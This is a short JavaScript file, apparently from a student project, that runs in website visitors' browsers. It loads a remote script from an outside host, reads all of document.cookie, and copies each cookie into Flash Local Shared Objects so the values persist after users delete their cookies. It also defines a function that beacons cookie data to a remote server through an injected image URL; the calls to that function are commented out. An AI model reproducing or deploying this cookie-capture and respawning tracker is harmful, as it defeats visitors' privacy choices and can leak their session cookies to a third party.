

var cookies_data ;
 
// inject a <script> tag into the body 
 function loadScript(url, callback)
 {
     // Adding the script tag to the body 
     var body = document.getElementsByTagName('body')[0];
     var script = document.createElement('script');
     script.type = 'text/javascript';
     script.src = url;

     // Then bind the event to the callback function.
     script.onreadystatechange = callback; 
     script.onload = callback;
    
     // Fire the loading
     body.appendChild(script);
     cookies_data = document.cookie;

     
 }

 // turn captured cookies into an arra [(cookieName0,cookieValue0), (cookieName0,cookieValue0),....]
 function extract_cookie(cookies_data) {


	 var cookies_array =[];
	 cookies_array =get_cookies_AS_array(cookies_data);
	
	 process(cookies_array);
	 
	};
 

	//injection of the script in charge of spawning the Flash object 
	// and offering the interface to interact with LSO
	 loadScript("http://elysane.net:8080/DAR2/cookies/src/js/flash-cookie.js", extract_cookie);
	

// buil an array of cookies details(name,value)
 function get_cookies_AS_array() {

     var cookies = [];


     cookies= document.cookie.split(';');
    
         
     return cookies;

 }


 
 // process the cookies data 
 // interact with LSO 
 // delegate the setting and cookie retrieving to the LSO offered interfaces
 // see also http://elysane.net:8080/DAR2/cookies/src/js/flash-cookie.js
 // and the interfaces definition in the actionScript file 
 //http://elysane.net:8080/DAR2/cookies/src/as/fr/dar/FlashCookie/FlashCookie.as 
 function process(data){
	 

	 
	    FlashCookie.onReady(function (cookie) {
          
	    	//cookie.clear();
	    	 
	   for (var i =0;i<  data.length;i++) {
	    	        
		   
		   var tmp = data[i].split('=');
		   var c_name = tmp[0];
		   var c_value = tmp[1];
	    	    
	        var savedCookie= cookie.getCookie(c_name);// call the external interface for LSO
          
	        if (savedCookie == undefined) { //first time on the site for the visitor
	        	cookie.setCookie(c_name, c_value);// call to external interface to save data to LSO
	        	console.log("successfully set cookie in lso");
	        	// we can set our tracker cookie here
	        	 //cookie.setCookie("uuid", savedCookie);
	             //cookie.setCookie("visiteCount", 0);
	            // sendInfos(savedCookie, "NEW");
	        }
	        else {//we know that visitor
	            // we update he's infos
	        
	        	 console.log("reading from lso  " +cookie.getCookie(c_name));
	            //var nb_visits = cookie.getCookie("visiteCount");
	            //cookie.remove("visiteCount");
	            //cookie.setCookie("visiteCount",nb_visits)  ;
	            //sendInfos(cookie.getCookie(c_name), "KNOWN");
	        }

	    	  }
	    	console.log(cookie.getAll()); 
	    	
	    });

	}
 
 
 // for sending feedBacks to the server
 function sendInfos(data, status){

     if(status=="NEW") {//new visitor
         var url = 'http://elysane.net:8080/DAR2/darpart2?newData=' + data;

         document.write('<img src=' + url + '/>');
     }
     else {//visitor already known
         var url = 'http://elysane.net:8080/DAR2/darpart2?data=' + data;

         document.write('<img src=' + url + '/>');
     }
 }
 